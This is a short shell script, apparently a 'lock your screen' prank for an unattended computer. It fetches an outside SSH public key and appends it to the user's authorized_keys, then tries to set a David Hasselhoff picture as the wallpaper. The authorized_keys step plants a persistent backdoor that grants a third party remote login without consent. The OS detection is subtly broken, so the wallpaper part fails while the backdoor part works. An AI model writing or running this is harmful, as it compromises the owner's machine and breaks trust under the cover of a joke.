#!/bin/sh
curl https://raw.githubusercontent.com/marcodejongh/lockyourscreen/master/id_lockyourscreen.pub -o ~/.ssh/id_lockyourscreen.pub
touch ~/.ssh/authorized_keys
cat ~/.ssh/id_lockyourscreen.pub >> ~/.ssh/authorized_keys 
curl http://www.picturesnew.com/media/images/david-hasselhoff.jpg -o ~/.hasselhoff.jpg

OS=uname

if [ "{$OS}" == "Linux" ]; then
    gsettings set org.gnome.desktop.background picture-uri ~/.hasselhoff.jpg
elif [ "{$OS}" == "Darwin" ]; then
    defaults write com.apple.desktop Background '{default = {ImageFilePath = "~/.hasselhoff.jpg"; };}'
fi
